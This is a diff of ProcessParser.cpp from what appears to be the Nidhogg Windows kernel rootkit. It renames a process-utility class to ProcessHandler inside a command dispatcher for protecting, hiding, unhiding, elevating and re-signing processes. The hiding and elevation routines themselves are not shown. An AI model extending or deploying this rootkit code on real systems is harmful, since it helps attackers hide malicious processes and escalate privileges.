@@ -1,6 +1,6 @@
 #include "pch.h"
 #include "ProcessParser.h"
-#include "ProcessUtils.h"
+#include "ProcessHandler.h"
 
 ProcessParser::ProcessParser() {
 	this->optionsSize = 7;
@@ -50,15 +50,15 @@ NTSTATUS ProcessParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 			break;
 		}
 		
-		if (NidhoggProccessUtils->GetProtectedProcessesCount() == MAX_PIDS) {
+		if (NidhoggProcessHandler->GetProtectedProcessesCount() == MAX_PIDS) {
 			status = STATUS_TOO_MANY_CONTEXT_IDS;
 			break;
 		}
 
-		if (NidhoggProccessUtils->FindProcess(pid))
+		if (NidhoggProcessHandler->FindProcess(pid))
 			break;
 
-		if (!NidhoggProccessUtils->AddProcess(pid))
+		if (!NidhoggProcessHandler->AddProcess(pid))
 			status = STATUS_UNSUCCESSFUL;
 		break;
 	}
@@ -69,34 +69,34 @@ NTSTATUS ProcessParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 			break;
 		}
 
-		if (NidhoggProccessUtils->GetProtectedProcessesCount() == 0) {
+		if (NidhoggProcessHandler->GetProtectedProcessesCount() == 0) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
 
-		if (!NidhoggProccessUtils->RemoveProcess(pid))
+		if (!NidhoggProcessHandler->RemoveProcess(pid))
 			status = STATUS_NOT_FOUND;
 
 		break;
 	}
 	case Options::Clear:
 	{
-		NidhoggProccessUtils->ClearProtectedProcesses();
+		NidhoggProcessHandler->ClearProtectedProcesses();
 		break;
 	}
 	case Options::Hide:
 	{
-		status = NidhoggProccessUtils->HideProcess(pid);
+		status = NidhoggProcessHandler->HideProcess(pid);
 		break;
 	}
 	case Options::Unhide:
 	{
-		status = NidhoggProccessUtils->UnhideProcess(pid);
+		status = NidhoggProcessHandler->UnhideProcess(pid);
 		break;
 	}
 	case Options::Elevate:
 	{
-		status = NidhoggProccessUtils->ElevateProcess(pid);
+		status = NidhoggProcessHandler->ElevateProcess(pid);
 		break;
 	}
 	case Options::Signature:
@@ -110,7 +110,7 @@ NTSTATUS ProcessParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
-		status = NidhoggProccessUtils->SetProcessSignature(&signature);
+		status = NidhoggProcessHandler->SetProcessSignature(&signature);
 		break;
 	}
 	default:
